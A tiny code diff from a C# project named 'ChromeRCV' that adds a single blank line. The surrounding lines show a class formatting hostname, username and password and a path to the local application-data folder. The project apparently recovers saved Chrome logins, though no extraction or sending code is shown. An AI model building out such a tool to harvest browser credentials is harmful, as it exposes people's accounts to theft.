@@ -47,6 +47,7 @@ namespace ChromeRCV
             return string.Format("{0} - {1} - {2}", _hostname, _username, _password);
         }
     }
+    
     class Program
     {
         private static string LocalAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
